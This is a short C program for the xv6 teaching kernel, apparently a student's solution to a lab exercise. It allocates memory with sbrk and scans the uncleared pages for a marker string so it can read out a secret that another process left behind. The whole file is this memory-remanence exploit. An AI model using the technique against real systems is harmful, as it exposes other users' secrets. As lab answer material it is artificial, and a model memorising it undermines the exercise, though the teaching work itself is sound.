#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"


int
main(int argc, char *argv[])
{
  // your code here.  you should write the secret to fd 2 using write
  // (e.g., write(2, secret, 8)
  const char *pattern = "my very very very secret pw is:   ";
  int pattern_offset = 8; // Start matching after the first 8 characters.
  int pattern_len = 24;   // Length of the pattern to match (after the first 8 characters).
  int secret_len = 8;     // Length of the secret to extract.
  int pages = 1024;       // Number of pages to allocate (adjust as needed).

  char *end = sbrk(PGSIZE * pages);
  if (end == (char *)-1) {
    printf("attack: sbrk failed\n");
    exit(1);
  }

  for (char *ptr = end; ptr < end + PGSIZE * pages - pattern_len; ptr++) {
    // Use memcmp to check if the current position matches the prefix.
    if (memcmp(ptr, pattern + pattern_offset, pattern_len) == 0) {
      // Found the prefix, the secret is right after it.
      char *secret_addr = ptr + pattern_len;
      write(2, secret_addr, secret_len);
      exit(0); // Success.
    }
  }

  // If the loop finishes without finding the secret.
  printf("attack: secret not found\n");
  exit(1);
}
